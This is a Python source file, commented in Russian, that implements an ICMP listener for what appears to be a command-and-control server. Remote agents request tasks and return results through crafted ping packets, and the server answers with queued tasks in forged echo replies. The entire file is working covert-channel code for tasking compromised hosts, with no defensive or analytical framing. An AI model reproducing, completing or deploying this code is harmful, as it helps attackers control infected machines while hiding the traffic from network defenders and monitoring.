import socket
import struct

HOST = "0.0.0.0"

def checksum(data):
    summ = 0
    
    i = 0
    while i + 1 < len(data):
        word = struct.unpack_from("!H", data, i)[0]
        summ += word
        i += 2

    if i < len(data):
        summ += data[i]

    while summ >> 16:
        summ = (summ & 0xffff) + (summ >> 16)

    return (~summ) & 0xffff

def run_icmp(stop_event, task_manager):

    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
        #bind(), listen() и accept() не используется так как работа идет с сырыми сокетами
        print("[+/ICMP] icmp-слушатель работает.")

        while not stop_event.is_set():
            ip_packet, address = s.recvfrom(1024)
            ip_len_hdr = (ip_packet[0] & 0x0f) * 4
            icmp_type = ip_packet[ip_len_hdr]
            icmp_payload = ip_packet[ip_len_hdr + 8:]
            
            if icmp_type != 8:
                continue

            if icmp_payload[:8] == "GET_TASK".encode('utf-8'):
                agent_id = icmp_payload[9:-1].decode('utf-8') 

                connection = task_manager.get_connection()

                try:
                    task = task_manager.get_next_task(connection, agent_id)

                    if task is None:
                        answer = "TASK|null|".encode('utf-8')
                    else:
                        answer = f"TASK|{task[0]}|{task[1]}|".encode('utf-8')
                        print("[+/ICMP]Задача отправлена агенту.")

                    header_icmp = struct.pack("!BBHHH", 0, 0, 0, 0x666, 1)
                    packet = header_icmp + answer
                    chsm = checksum(packet)
                    header_icmp = struct.pack("!BBHHH", 0, 0, chsm, 0x666, 1)
                    packet = header_icmp + answer
 
                    s.sendto(packet, address)
                finally:
                    connection.close()

            elif icmp_payload[:6] == "RESULT".encode('utf-8'):
                payload_str = icmp_payload.decode('utf-8')
                parts = payload_str.split('|', 2)
                task_id = parts[1]
                result = parts[2][:-1]
                
                connection = task_manager.get_connection()

                try:
                    task_manager.complete_task(connection, task_id, result) 
                    
                    print(f"[+/ICMP] Получен результат по задаче ({task_id}).")
                finally:
                    connection.close()

    print("[+/ICMP] icmp-слушатель прекратил работу.")
